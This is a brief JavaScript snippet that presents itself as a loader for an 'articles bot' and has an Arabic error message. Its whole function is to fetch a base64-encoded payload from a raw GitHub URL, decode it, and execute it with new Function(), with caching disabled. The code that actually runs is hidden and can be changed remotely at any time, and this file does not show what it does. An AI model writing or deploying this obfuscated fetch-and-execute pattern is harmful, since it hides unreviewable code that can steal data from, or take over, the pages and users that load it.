(function () {
    var PAYLOAD_URL = 'https://raw.githubusercontent.com/raadchat/Chat2/refs/heads/main/articles-bot.payload.txt';
    var url = PAYLOAD_URL + (PAYLOAD_URL.indexOf('?') === -1 ? '?' : '&') + '_=' + Date.now();

    fetch(url, { cache: 'no-store' })
        .then(function (res) {
            if (!res.ok) throw new Error('HTTP ' + res.status);
            return res.text();
        })
        .then(function (b64) {
            var bin = atob(b64.trim());
            var bytes = [];
            for (var i = 0; i < bin.length; i++) {
                bytes.push(bin.charCodeAt(i));
            }
            var code = new TextDecoder('utf-8').decode(new Uint8Array(bytes));
            new Function(code)();
        })
        .catch(function (err) {
            console.log('فشل تحميل بوت المقالات: ' + err);
        });
})();
